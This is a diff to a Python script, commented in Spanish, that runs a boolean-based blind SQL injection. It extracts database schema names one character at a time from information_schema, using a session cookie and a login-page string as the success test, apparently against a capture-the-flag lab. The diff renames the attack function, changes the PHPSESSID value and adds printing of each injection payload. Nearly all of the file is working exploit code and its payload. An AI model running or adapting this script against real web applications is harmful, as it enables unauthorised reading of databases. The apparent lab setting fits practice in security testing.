@@ -9,7 +9,7 @@ unsafe_url = set("&?#=%+;:@[]/ \\\"'`{}|^~,")  # reservados/delimitadores + espa
 chars = ''.join(c for c in (string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation)
                 if c not in unsafe_url) or (string.ascii_letters + string.digits + "_")
 
-cookies = {'PHPSESSID': 'q69doup7448j1j18ajjlijhr66'}
+cookies = {'PHPSESSID': 'd687mu751epg8huln7u84dm6e1'}
 
 # --Funciones--
 def StopProgram(sig, frame):
@@ -18,7 +18,7 @@ def StopProgram(sig, frame):
 
 signal.signal(signal.SIGINT, StopProgram)
 
-def SQLiAttack():
+def SQLiAttackDB():
     p1 = log.progress("Fuerza Bruta")
     p1.status("Inicia Progreso de fuerza Bruta")
     time.sleep(1)
@@ -32,6 +32,7 @@ def SQLiAttack():
             found = False
             for character in chars:
                 sqli = url + f"'+AND+(SELECT+substring(schema_name,{position_character},1)+FROM+information_schema.schemata+limit+{dbs},1)%3d'{character}-- "
+                p1.status(sqli)
                 r = requests.get(sqli, cookies=cookies)
                 if "Welcome to the IMF Administration." in r.text:
                     nombre_db += character
@@ -48,4 +49,4 @@ def SQLiAttack():
         print(resultado)
 
 if __name__ == "__main__":
-    SQLiAttack()
+    SQLiAttackDB()
